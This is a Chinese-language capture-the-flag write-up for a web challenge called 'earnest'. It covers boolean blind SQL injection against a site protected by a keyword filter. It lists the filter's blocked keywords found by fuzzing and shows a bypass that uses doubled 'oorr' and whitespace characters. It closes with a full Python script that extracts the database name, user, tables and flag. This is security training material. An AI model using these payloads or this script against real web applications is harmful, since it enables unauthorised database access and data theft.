# 认真一点吧

## 题目

> http://ctf5.shiyanbar.com/web/earnest/index.php 
>
> 
> Please input the id
> 

分类：`sql injection` `布尔盲注` `waf过滤`

## 流程图

## 解题步骤

#### 参考文章

无

#### 步骤

1. 在文本框输入`1`，提交，查询到结果，返回

   >  You are in ................ 

2. 在文本框输入`2`，提交，未查询到

   > You are not in ............... 

3. 在文件框输入`1t`，提交，返回

   > You are  in ............... 

   这个时候并不能证明是那种注入，PHP可能进行了弱类型转换，也可能使用了`intval`来将字符串强制转换成了数值

   提交`1'`，返回

   > You are not in ............... 

   说明`'`没被过滤掉，被带入到了sql查询中；可以证明后台并没有使用intval来进行强制转换，同时，结合`1t`被弱类型转换，或者被过滤的事实，说明这里是字符型注入，而不是数字型注入

4. 测试`1' and 1=1`，返回

   > # Sql injection detected!

   说明存在waf的关键词过滤

5. 使用bp fuzz一下

   > Request	Payload	Length
   > 3	substr	802
   > 4	sleep	802
   > 7	union	802
   > 10	and	802
   > 13	||	802
   > 14	group by	802
   > 15	order by	802
   > 16	into outfile	802
   > 18	into dumpfile	802
   > 26	rand	802
   > 34	#	802
   > 36	%	802
   > 37	^	802
   > 51	|	802
   > 53	;	802
   > 59	,	802
   > 0		908
   > 1	for	911
   > 2	to	911
   > 5	ExtractValue	911
   > 6	select	911
   > 8	concat	911
   > 9	or	911
   > 11	limit	911
   > 12	&&	911
   > 17	into	911
   > 19	having	911
   > 20	where	911
   > 21	insert	911
   > 22	update	911
   > 23	delete	911
   > 24	updatexml	911
   > 25	if	911
   > 27	from	911
   > 28	information_schema	911
   > 29	mid	911
   > 30	ord	911
   > 31	~	911
   > 32	!	911
   > 33	@	911
   > 35	$	911
   > 38	&	911
   > 39	*	911
   > 40	(	911
   > 41	)	911
   > 42	_	911
   > 43	+	911
   > 44	-	911
   > 45	=	911
   > 46	[	911
   > 47	]	911
   > 48	{	911
   > 49	}	911
   > 50	\	911
   > 52	:	911
   > 54	"	911
   > 55	'	911
   > 56	<	911
   > 57	>	911
   > 58	?	911
   > 60	.	911
   > 61	/	911
   > 62	`	911

   长度802的关键词被检测出，而其他的则未被检测到

6. 在文本框输入`1' or '`，提交，发现被检测到，貌似在几个关键词组合出现的时候，就会被检测到

   使用`oorr`或者`Oz`，并使用`%09-%0d`中的任一字符代替掉空格，就可以绕过，语句为`1'%09oorr%09'`

   返回结果为

   > You are  in ............... 

7. > information什么倒是都没禁掉，但是注意information中包含or，需要替换掉。写一个二分盲注脚本即可，具体用到limit的offset偏移。然后它禁掉了substr，但是我们还有mid，用mid(table from offset)即可 

   写python脚本，布尔正则盲注爆破

   ```python
   # -*- coding:utf8 -*-
   __author__='pcat@chamd5.org'
   
   import requests
   import string
   import time
   
   def payload(rawstr):
       newstr=rawstr.replace(' ',chr(0x0a)).replace('or','oorr')
       return newstr
   
   
   def foo():
       url=r'http://ctf5.shiyanbar.com/web/earnest/index.php'
       mys=requests.session()
       cset=string.digits+string.lowercase+'!_{}@~.'
       true_state='You are in'
   
       lens=0
       i=1
       model="0' or length(database())=%d or 'pcat'='"
       while True:
           tmp= model %(i)
           myd={'id':payload(tmp),}
           res=mys.post(url,data=myd).content
           if true_state in res:
               lens=i
               break
           i+=1
           pass
       lens=18
       print("[+]length(database()): %d" %(lens))
   
       strs=''
       model="0' or (select database() regexp '%s$') or 'pcat'='"
       for i in range(lens):
           for c in cset:
               tmp=model %(c+strs)
               myd={'id':payload(tmp),}
               res=mys.post(url,data=myd).content
               if true_state in res:
                   strs=c+strs
                   print strs
                   break
           pass
       pass
       strs='ctf_sql_bool_blind'
       print("[+]database():%s" %(strs))
   
   
       lens=0
       i=1
       model="0' or length(user())=%d or 'pcat'='"
       while True:
           tmp= model %(i)
           myd={'id':payload(tmp),}
           res=mys.post(url,data=myd).content
           if true_state in res:
               lens=i
               break
           i+=1
           pass
       lens=14
       print("[+]length(user()): %d" %(lens))
   
       strs=''
       model="0' or (select user() regexp '%s$') or 'pcat'='"
       for i in range(lens):
           for c in cset:
               tmp=model %(c+strs)
               myd={'id':payload(tmp),}
               res=mys.post(url,data=myd).content
               if true_state in res:
                   strs=c+strs
                   print strs
                   break
           pass
       pass
       strs='web7@localhost'
       print("[+]user():%s" %(strs))
   
   
   
       lens=0
       i=1
       model="0' or length((select group_concat(table_name separator '@') from information_schema.tables where table_schema=database() limit 1))=%d or 'pcat'='"
       while True:
           tmp= model %(i)
           myd={'id':payload(tmp),}
           res=mys.post(url,data=myd).content
           if true_state in res:
               lens=i
               break
           i+=1
           pass
       lens=10
       print("[+]length(group_concat(table_name separator '@')): %d" %(lens))
   
       strs=''
       model="0' or (select (select group_concat(table_name separator '@') from information_schema.tables where table_schema=database() limit 1) regexp '%s$') or 'pcat'='"
       for i in range(lens):
           for c in cset:
               tmp=model %(c+strs)
               myd={'id':payload(tmp),}
               res=mys.post(url,data=myd).content
               if true_state in res:
                   strs=c+strs
                   print strs
                   break
           pass
       pass
       strs='fiag@users'
       print("[+]group_concat(table_name separator '@'):%s" %(strs))
   
   
       lens=0
       i=1
       model="0' or length((select group_concat(column_name separator '@') from information_schema.columns where table_name='fiag' limit 1))=%d or 'pcat'='"
       while True:
           tmp= model %(i)
           myd={'id':payload(tmp),}
           res=mys.post(url,data=myd).content
           if true_state in res:
               lens=i
               break
           i+=1
           pass
       lens=5
       print("[+]length(group_concat(column_name separator '@')): %d" %(lens))
   
       strs=''
       model="0' or (select (select group_concat(column_name separator '@') from information_schema.columns where table_name='fiag' limit 1) regexp '%s$') or 'pcat'='"
       for i in range(lens):
           for c in cset:
               tmp=model %(c+strs)
               myd={'id':payload(tmp),}
               res=mys.post(url,data=myd).content
               if true_state in res:
                   strs=c+strs
                   print strs
                   break
           pass
       pass
       # get fl.4g maybe is fl.4g or f1$4g
       strs='fl$4g'
       print("[+]group_concat(column_name separator '@'):%s" %(strs))
   
   
       lens=0
       i=1
       model="0' or length((select fl$4g from fiag limit 1))=%d or 'pcat'='"
       while True:
           tmp= model %(i)
           myd={'id':payload(tmp),}
           res=mys.post(url,data=myd).content
           if true_state in res:
               lens=i
               break
           i+=1
           pass
       lens=19
       print("[+]length(fl$4g): %d" %(lens))
   
       strs=''
       model="0' or (select (select fl$4g from fiag limit 1) regexp '%s$') or 'pcat'='"
       for i in range(lens):
           for c in cset:
               tmp=model %(c+strs)
               myd={'id':payload(tmp),}
               res=mys.post(url,data=myd).content
               if true_state in res:
                   strs=c+strs
                   print strs
                   break
           pass
       pass
       # get flag{haha~you.win!}
       strs='flag{haha~you win!}'
       print("[+]fl$4g:%s" %(strs))
       pass
   
   if __name__ == '__main__':
       foo()
       print 'ok'
   
   ```

## 解答思路




## 漏洞挖掘思路

- 无

## 自动化解析

- TODO

- 设定题目难度等级`level`为
- 提交相应符合要求的字符串

